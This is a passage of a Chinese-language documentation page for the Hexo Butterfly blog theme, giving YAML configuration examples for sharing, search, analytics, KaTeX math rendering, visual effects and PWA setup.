enable: true # or false</span><br><span class="line">  pubid: 你的pub-id</span><br></pre></td></tr></table></figure><h2 id="Sharejs"><a href="#Sharejs" class="headerlink" title="Sharejs"></a>Sharejs</h2><p>如果你不知道<a href="https://github.com/overtrue/share.js/">sharejs</a>，看看它的说明。</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sharejs:</span><br><span class="line">  enable: true</span><br><span class="line">  sites: facebook,twitter,wechat,weibo,qq #想要显示的内容</span><br></pre></td></tr></table></figure><h2 id="Addtoany"><a href="#Addtoany" class="headerlink" title="Addtoany"></a>Addtoany</h2><p>可以找到<a href="https://www.addtoany.com/">addtoany</a>查看使用说明</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">addtoany:</span><br><span class="line">  enable: false</span><br><span class="line">  item:</span><br><span class="line">    - facebook</span><br><span class="line">    - twitter</span><br><span class="line">    - wechat</span><br><span class="line">    - sina_weibo</span><br><span class="line">    - facebook_messenger</span><br><span class="line">    - email</span><br><span class="line">    - copy_link</span><br></pre></td></tr></table></figure><h1 id="搜索系统"><a href="#搜索系统" class="headerlink" title="搜索系统"></a>搜索系统</h1><h2 id="Algolia"><a href="#Algolia" class="headerlink" title="Algolia"></a>Algolia</h2><ol><li>你需要安装<a href="https://github.com/oncletom/hexo-algolia">hexo-algolia</a>或者<a href="https://github.com/LouisBarranqueiro/hexo-algoliasearch">hexo-algoliasearch</a>，根据它们的说明文档去做相应的配置。</li><li>配置<code>butterfly.yml</code></li></ol><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">algolia_search:</span><br><span class="line">  enable: true</span><br><span class="line">  hits:</span><br><span class="line">    per_page: 6</span><br><span class="line"></span><br><span class="line">  labels:</span><br><span class="line">    input_placeholder: Search for Posts</span><br><span class="line">    hits_empty: &quot;We didn&#39;t find any results for the search: $&#123;query&#125;&quot; # if there are no result</span><br><span class="line">    hits_stats: &quot;$&#123;hits&#125; results found in $&#123;time&#125; ms&quot;</span><br></pre></td></tr></table></figure><h2 id="本地搜索"><a href="#本地搜索" class="headerlink" title="本地搜索"></a>本地搜索</h2><ol><li>你需要安装<a href="https://github.com/wzpan/hexo-generator-search">hexo-generator-search</a>，根据它的文档去做相应的配置。<strong>注意格式只支持xml</strong></li><li>配置<code>butterfly.yml</code></li></ol><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: false</span><br><span class="line">  labels:</span><br><span class="line">    input_placeholder: Search for Posts</span><br><span class="line">    hits_empty: &quot;We didn&#39;t find any results for the search: $&#123;query&#125;&quot; # if there are no result</span><br></pre></td></tr></table></figure><h2 id="网站验证"><a href="#网站验证" class="headerlink" title="网站验证"></a>网站验证</h2><p>如果你需要搜索引擎收录你的网站，可能需要登录对应搜索引擎的管理平台进行提交。<br>各自的验证码可从各自管理平台拿到</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># Google Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;www.google.com&#x2F;webmasters&#x2F;</span><br><span class="line">google_site_verification:</span><br><span class="line"></span><br><span class="line"># Bing Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;www.bing.com&#x2F;webmaster&#x2F;</span><br><span class="line">bing_site_verification:</span><br><span class="line"></span><br><span class="line"># Yandex Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;webmaster.yandex.ru&#x2F;</span><br><span class="line">yandex_site_verification:</span><br><span class="line"></span><br><span class="line"># Baidu Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;ziyuan.baidu.com&#x2F;site&#x2F;</span><br><span class="line">baidu_site_verification:</span><br><span class="line"></span><br><span class="line"># 360 Webmaster tools verification setting</span><br><span class="line"># see http:&#x2F;&#x2F;zhanzhang.so.com&#x2F;</span><br><span class="line">qihu_site_verification:</span><br></pre></td></tr></table></figure><h1 id="分析统计"><a href="#分析统计" class="headerlink" title="分析统计"></a>分析统计</h1><h2 id="百度统计"><a href="#百度统计" class="headerlink" title="百度统计"></a>百度统计</h2><ol><li><p>登录百度统计的<a href="https://tongji.baidu.com/web/welcome/login">官方网站</a></p></li><li><p>找到你百度统计的统计代码<br>！</p></li><li><p>配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">butterfly.yml</span><br></pre></td></tr></table></figure><p>code</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">baidu_analytics: 你的代码 #只复制打码部分</span><br></pre></td></tr></table></figure></li></ol><h2 id="谷歌统计"><a href="#谷歌统计" class="headerlink" title="谷歌统计"></a>谷歌统计</h2><ol><li>登录谷歌分析的<a href="https://www.google.com/analytics/">官方网站</a></li><li>找到你的谷歌分析的追踪ID</li><li>配置<code>butterfly.yml</code></li></ol><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">google_analytics: 你的代码 # 通常以&#39;UA_&#39;打头</span><br></pre></td></tr></table></figure><h1 id="Mathjax"><a href="#Mathjax" class="headerlink" title="Mathjax"></a>Mathjax</h1><p>建议使用KaTex获得更好的效果，下文有介绍!</p><p>配置<code>butterfly.yml</code>:</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mathjax:</span><br><span class="line">  enable: true # or false</span><br><span class="line">  cdn: https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;mathjax&#x2F;2.7.2&#x2F;MathJax.js?config&#x3D;TeX-AMS-MML_HTMLorMML # required</span><br></pre></td></tr></table></figure><p>然后你需要修改一下默认的<code>markdown</code>渲染引擎来实现MathJax的效果。</p><p>查看:<a href="https://www.npmjs.com/package/hexo-renderer-kramed">hexo-renderer-kramed</a></p><p>以下操作在你hexo博客的目录下(mathjax.png)]</p><p>首先禁用<code>MathJax</code>(如果你配置过MathJax的话)，然后修改你的<code>butterfly.yml</code>以便加载<code>katex.min.css</code>:</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">katex:</span><br><span class="line">  enable: true</span><br><span class="line">  cdn: </span><br><span class="line">    css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;katex@latest&#x2F;dist&#x2F;katex.min.css</span><br></pre></td></tr></table></figure><p>你不需要添加<code>katex.min.js</code>来渲染数学方程。相应的你需要卸载你之前的hexo的markdown渲染器以及<code>hexo-math</code>，然后安装新的<code>hexo-renderer-markdown-it-plus</code>:</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 替换 &#96;hexo-renderer-kramed&#96; 或者 &#96;hexo-renderer-marked&#96; 等hexo的markdown渲染器</span><br><span class="line"># 你可以在你的package.json里找到hexo的markdwon渲染器，并将其卸载</span><br><span class="line">npm un hexo-renderer-marked --save</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line"></span><br><span class="line">npm un hexo-renderer-kramed --save</span><br><span class="line"></span><br><span class="line"># 卸载 &#96;hexo-math&#96;</span><br><span class="line">npm un hexo-math --save</span><br><span class="line"></span><br><span class="line"># 然后安装 &#96;hexo-renderer-markdown-it-plus&#96;</span><br><span class="line">npm i @upupming&#x2F;hexo-renderer-markdown-it-plus --save</span><br></pre></td></tr></table></figure><p>注意到<code>hexo-renderer-markdown-it-plus</code>已经无人持续维护，所以我们使用<code>@upupming/hexo-renderer-markdown-it-plus</code>。这份fork的代码使用了<code>@neilsustc/markdown-it-katex</code>同时它也是VSCode的插件<a href="https://github.com/yzhang-gh/vscode-markdown">Markdown All in One</a>所使用的，所以我们可以获得最新的KaTex功能例如<code>\tag&#123;&#125;</code>。</p><p>你还可以通过<code>@neilsustc/markdown-it0katex</code>控制KaTex的设置，所有可配置的选项参见<a href="https://katex.org/docs/options.html%E3%80%82%E6%AF%94%E5%A6%82%E4%BD%A0%E6%83%B3%E8%A6%81%E7%A6%81%E7%94%A8%E6%8E%89KaTex%E5%9C%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8A%E8%BE%93%E5%87%BA%E7%9A%84%E5%AE%82%E9%95%BF%E7%9A%84%E8%AD%A6%E5%91%8A%E4%BF%A1%E6%81%AF%EF%BC%8C%E4%BD%A0%E5%8F%AF%E4%BB%A5%E5%9C%A8%E6%A0%B9%E7%9B%AE%E5%BD%95%E7%9A%84%60_config.yml%60%E4%B8%AD%E4%BD%BF%E7%94%A8%E4%B8%8B%E9%9D%A2%E7%9A%84%E9%85%8D%E7%BD%AE%E5%B0%86%60strict%60%E8%AE%BE%E7%BD%AE%E4%B8%BAflase">https://katex.org/docs/options.html。比如你想要禁用掉KaTex在命令行上输出的宂长的警告信息，你可以在根目录的`_config.yml`中使用下面的配置将`strict`设置为flase</a>:</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">markdown_it_plus:</span><br><span class="line">  plugins:</span><br><span class="line">    - plugin:</span><br><span class="line">      name: &#39;@neilsustc&#x2F;markdown-it-katex&#39;</span><br><span class="line">      enable: true</span><br><span class="line">      options:</span><br><span class="line">        strict: false</span><br></pre></td></tr></table></figure><p>当然，你还可以利用这个特征性来定义一些自己常用的额<code>macros</code>.</p><p>因为KaTex更快更轻量，因此没有MathJax的功能多(比如右键菜单)。为那些使用MathJax的用户，我们也为KaTex默认添加了<a href="https://github.com/upupming/katex-copytex">Copy As TeX Code</a>的功能。<br><img src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-katex.gif" alt="img"></p><h1 id="美化-特效"><a href="#美化-特效" class="headerlink" title="美化/特效"></a>美化/特效</h1><h2 id="自定义主题色"><a href="#自定义主题色" class="headerlink" title="自定义主题色"></a>自定义主题色</h2><p>可以修改大部分UI颜色</p><p>配置<code>butterfly.yml</code>，比如:</p><p>颜色值必须被双引号包裹，就像<code>&quot;#000&quot;</code>而不是<code>#000</code>。否则将会在构建的时候报错！</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">theme_color:</span><br><span class="line">  enable: true</span><br><span class="line">  main: &quot;#9370DB&quot;</span><br><span class="line">  paginator: &quot;#7A7FF1&quot;</span><br><span class="line">  button_hover: &quot;#FF7242&quot;</span><br><span class="line">  text_selection: &quot;#69c46d&quot;</span><br><span class="line">  link_color: &quot;#858585&quot;</span><br><span class="line">  hr_color: &quot;#A4D8FA&quot;</span><br><span class="line">  read-mode-bg_color: &#39;#FAF9DE&#39;</span><br></pre></td></tr></table></figure><h2 id="网站背景"><a href="#网站背景" class="headerlink" title="网站背景"></a>网站背景</h2><p>默认显示白色，可设置图片或颜色</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 图片格式 background: url(http:&#x2F;&#x2F;xxxxxx.com&#x2F;xxx.jpg)</span><br><span class="line"># 顔色 background: &#39;#49B202&#39;</span><br><span class="line"># 留空 显示白色</span><br><span class="line">background:</span><br></pre></td></tr></table></figure><h2 id="footer背景"><a href="#footer背景" class="headerlink" title="footer背景"></a>footer背景</h2><p>footer的背景会与<code>top_img</code>的一致，当设置<code>flase</code>时，将与主题颜色一致。</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># footer是否显示图片背景(与top_img一致)</span><br><span class="line">footer_bg: true</span><br></pre></td></tr></table></figure><h2 id="打字特效"><a href="#打字特效" class="headerlink" title="打字特效"></a>打字特效</h2><p>打字特效<a href="https://github.com/disjukr/activate-power-mode">activate-power-mode</a></p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">activate_power_mode:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure><h2 id="禁止彩带"><a href="#禁止彩带" class="headerlink" title="禁止彩带"></a>禁止彩带</h2><p>好看的彩带背景，可以设置每次刷新更换彩带，或者点击更换彩带</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">canvas_ribbon:</span><br><span class="line">  enable: false</span><br><span class="line">  size: 150</span><br><span class="line">  alpha: 0.6</span><br><span class="line">  zIndex: -1</span><br><span class="line">  click_to_change: false #设置是否每次点击都更换彩带</span><br><span class="line">  mobile: fasel # false 手机端不显示 true 手机端显示</span><br></pre></td></tr></table></figure><p>相关配置可查看<a href="https://github.com/hustcc/ribbon.js">canvas_ribbon</a></p><h2 id="动态彩带"><a href="#动态彩带" class="headerlink" title="动态彩带"></a>动态彩带</h2><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">canvas_ribbon_piao:</span><br><span class="line">  enable: true</span><br><span class="line">  mobile: false # false 手机端不显示 true 手机端显示</span><br></pre></td></tr></table></figure><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">canvas_nest:</span><br><span class="line">  enable: true</span><br><span class="line">  color: &#39;0,0,255&#39; #color of lines, default: &#39;0,0,0&#39;; RGB values: (R,G,B).(note: use &#39;,&#39; to separate.)</span><br><span class="line">  opacity: 0.7 # the opacity of line (0~1), default: 0.5.</span><br><span class="line">  zIndex: -1 # z-index property of the background, default: -1.</span><br><span class="line">  count: 99 # the number of lines, default: 99.</span><br><span class="line">  mobile: false # false 手机端不显示 true 手机端显示</span><br></pre></td></tr></table></figure><h2 id="鼠标点击效果"><a href="#鼠标点击效果" class="headerlink" title="鼠标点击效果"></a>鼠标点击效果</h2><h3 id="烟花"><a href="#烟花" class="headerlink" title="烟花"></a>烟花</h3><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fireworks:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure><h3 id="爱心"><a href="#爱心" class="headerlink" title="爱心"></a>爱心</h3><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 点击出现爱心</span><br><span class="line">click_heart:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure><h3 id="文字"><a href="#文字" class="headerlink" title="文字"></a>文字</h3><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 点击出现文字，文字可自行修改</span><br><span class="line">ClickShowText:</span><br><span class="line">  enable: false</span><br><span class="line">  text: </span><br><span class="line">    - 富强</span><br><span class="line">    - 民主</span><br><span class="line">    - 文明</span><br><span class="line">    - 和谐</span><br><span class="line">    - 自由</span><br><span class="line">    - 平等</span><br><span class="line">    - 公正</span><br><span class="line">    - 法治</span><br><span class="line">    - 爱国</span><br><span class="line">    - 敬业</span><br><span class="line">    - 诚信</span><br><span class="line">    - 友善</span><br><span class="line">  fontSize: 15px</span><br></pre></td></tr></table></figure><h2 id="文章页美化"><a href="#文章页美化" class="headerlink" title="文章页美化"></a>文章页美化</h2><p>会改变ol、ul、h1-h5的样式</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post_beautify:</span><br><span class="line">  enable: true</span><br><span class="line">  title-prefix-icon: &#39;\f0c1&#39;</span><br><span class="line">  title-prefix-icon-color: &quot;#F4766&quot;</span><br></pre></td></tr></table></figure><p><code>title-prefix-icon</code>填写的是fontawesome的icon的Unicode数。</p><h3 id="自定义字体"><a href="#自定义字体" class="headerlink" title="自定义字体"></a>自定义字体</h3><p>可自行设置字体的<code>font-family</code></p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">font:</span><br><span class="line">  enable: true</span><br><span class="line">  font-family: Lato, Helvetica Neue For Number, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, PingFang SC, Hiragino Sans GB,&quot;Microsoft JhengHei&quot;, &quot;MicrMicrosoft YaHei&quot;, Helvetica Neue, Helvetica, Arial, sans-serif</span><br><span class="line">  code-font: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft JhengHei&quot;,&quot;Microsoft YaHei&quot;, monospace, Helvetica Neue For Number</span><br></pre></td></tr></table></figure><h3 id="网站副标题"><a href="#网站副标题" class="headerlink" title="网站副标题"></a>网站副标题</h3><p>适用于版本号&gt;=V1.2.0</p><p>V2.0.0开始增加一些第三方api调用</p><p>可设置主页中显示的网站副标题或则喜欢的座右铭。</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 主页subtitle</span><br><span class="line"># 打字效果</span><br><span class="line">subtitle: </span><br><span class="line">  enable: true</span><br><span class="line">  # source调用第三方服务</span><br><span class="line">  # source: false 关闭调用 </span><br><span class="line">  # source: 1  调用金山词霸的每日一句（简体）</span><br><span class="line">  # source: 2  调用一言网的一句话（简体） #https:&#x2F;&#x2F;hitokoto.cn&#x2F;</span><br><span class="line">  # source: 3  调用一句网（简体） http:&#x2F;&#x2F;yijuzhan.com&#x2F;</span><br><span class="line">  # source: 4  调用今日诗词（简体） https:&#x2F;&#x2F;www.jinrishici.com&#x2F;</span><br><span class="line">  # subtitle 会先显示 source , 再显示 sub 的内容</span><br><span class="line">  source: false</span><br><span class="line">  # (如果有英文逗号&#39; , &#39;，请使用转义字符 &amp;#44;)</span><br><span class="line">  sub: #以下是自定义语句</span><br><span class="line">    - 一开始我就输了</span><br><span class="line">    - 我是算命的，你算什么东西</span><br></pre></td></tr></table></figure><h3 id="top-img显示大小"><a href="#top-img显示大小" class="headerlink" title="top_img显示大小"></a>top_img显示大小</h3><p>适用于版本号&gt;=V1.2.0</p><p>默认的显示为全屏。site-info的区域会居中显示</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 主页设置</span><br><span class="line"># 默认top_img全屏，site_info在中间</span><br><span class="line"># 使用默认, 都无需填写（建议默认）</span><br><span class="line">index_site_info_top:   #主页标题距离顶部距离  例如 300px&#x2F;300em&#x2F;300rem&#x2F;10%</span><br><span class="line">index_top_img_height:  #主页top_img高度 例如 300px&#x2F;300em&#x2F;300rem  不能使用百分比</span><br></pre></td></tr></table></figure><p>注意:<code>index_top_img_height</code>的值不能使用百分比。<br>2个都不填的话会使用默认值</p><p>举例 当</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index_site_info_top: 40%</span><br><span class="line">index_top_img_height: 400px</span><br></pre></td></tr></table></figure><h3 id="PWA"><a href="#PWA" class="headerlink" title="PWA"></a>PWA</h3><p>要为<code>Butterfly</code>配上PWA特性，你需要如下几个步骤：</p><ol><li><p>打开hexo工作目录</p></li><li><p><code>nmp install hexo-offline --save</code>或者<code>yarn add hexo-offline</code></p></li><li><p>修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_config.yml</span><br></pre></td></tr></table></figure><p>在站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_config.yml</span><br></pre></td></tr></table></figure><p>中增加以下内容。</p></li></ol><p>   yaml</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># offline config passed to sw-precache.</span><br><span class="line">offline:</span><br><span class="line">  maximumFileSizeToCacheInBytes: 10485760 # 缓存的最大文件大小，以字节为单位</span><br><span class="line">  staticFileGlobs:</span><br><span class="line">    - public&#x2F;**&#x2F;*.&#123;js,html,css,png,jpg,gif,svg,webp,eot,ttf,woff,woff2&#125;</span><br><span class="line">  # 静态文件合集，如果你的站点使用了例如webp格式的文件，请将文件类型添加进去。</span><br><span class="line">  stripPrefix: public</span><br><span class="line">  verbose: true</span><br><span class="line">  runtimeCaching:</span><br><span class="line">    # CDNs - should be cacheFirst, since they should be used specific versions so should not change</span><br><span class="line">    - urlPattern: &#x2F;* # 如果你需要加载CDN资源，请配置该选项，如果没有，可以不配置。</span><br><span class="line">      handler: cacheFirst</span><br><span class="line">      options:</span><br><span class="line">        origin: your_websie_url # 可替换成你的 url</span><br></pre></td></tr></table></figure><p>   更多内容请查看</p><p>   hexo-offline</p><p>   的官方文档</p><ol start="4"><li><p>在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">butterfly.yml</span><br></pre></td></tr></table></figure><p>中开启pwa选项。</p></li></ol><p>   yaml</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwa:</span><br><span class="line">  enable: true</span><br><span class="line">  manifest: &#x2F;img&#x2F;pwa&#x2F;manifest.json</span><br><span class="line">  theme_color: &quot;#fff&quot;</span><br><span class="line">  apple_touch_icon: &#x2F;img&#x2F;pwa&#x2F;apple-touch-icon.png</span><br><span class="line">  favicon_32_32: &#x2F;img&#x2F;pwa&#x2F;32.png</span><br><span class="line">  favicon_16_16: &#x2F;img&#x2F;pwa&#x2F;16.png</span><br><span class="line">  mask_icon: &#x2F;img&#x2F;pwa&#x2F;safari-pinned-tab.svg</span><br></pre></td></tr></table></figure><ol start="5"><li><p>在创建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source&#x2F;</span><br></pre></td></tr></table></figure><p>目录中创建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manifest.json</span><br></pre></td></tr></table></figure><p>文件。</p></li></ol><p>   json</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;: &quot;string&quot;, &#x2F;&#x2F;应用全称</span><br><span class="line">    &quot;short_name&quot;: &quot;Junzhou&quot;, &#x2F;&#x2F;应用简称</span><br><span class="line">    &quot;theme_color&quot;: &quot;#49b1f5&quot;, &#x2F;&#x2F;匹配浏览器的地址栏颜色</span><br><span class="line">    &quot;background_color&quot;: &quot;#49b1f5&quot;,&#x2F;&#x2F;加载应用时的背景色</span><br><span class="line">    &quot;display&quot;: &quot;standalone&quot;,&#x2F;&#x2F;首选显示模式 其他选项有：fullscreen,minimal-ui,browser</span><br><span class="line">    &quot;scope&quot;: &quot;&#x2F;&quot;,</span><br><span class="line">    &quot;start_url&quot;: &quot;&#x2F;&quot;,</span><br><span class="line">    &quot;icons&quot;: [ &#x2F;&#x2F;该数组指定icons图标参数，用来时适配不同设备（需为png，至少包含一个192px*192px的图标）</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;src&quot;: &quot;images&#x2F;pwaicons&#x2F;36.png&quot;, &#x2F;&#x2F;图标文件的目录，需在source&#x2F;目录下自行创建。</span><br><span class="line">          &quot;sizes&quot;: &quot;36x36&quot;,</span><br><span class="line">          &quot;type&quot;: &quot;image&#x2F;png&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;src&quot;: &quot;images&#x2F;pwaicons&#x2F;48.png&quot;,</span><br><span class="line">          &quot;sizes&quot;: &quot;48x48&quot;,</span><br><span class="line">          &quot;type&quot;: &quot;image&#x2F;png&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;src&quot;: &quot;images&#x2F;pwaicons&#x2F;72.png&quot;,</span><br><span class="line">          &quot;sizes&quot;: &quot;72x72&quot;,</span><br><span class="line">          &quot;type&quot;: &quot;image&#x2F;png&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;src&quot;: &quot;images&#x2F;pwaicons&#x2F;96.png&quot;,</span><br><span class="line">          &quot;sizes&quot;: &quot;96x96&quot;,</span><br><span class="line">          &quot;type&quot;: 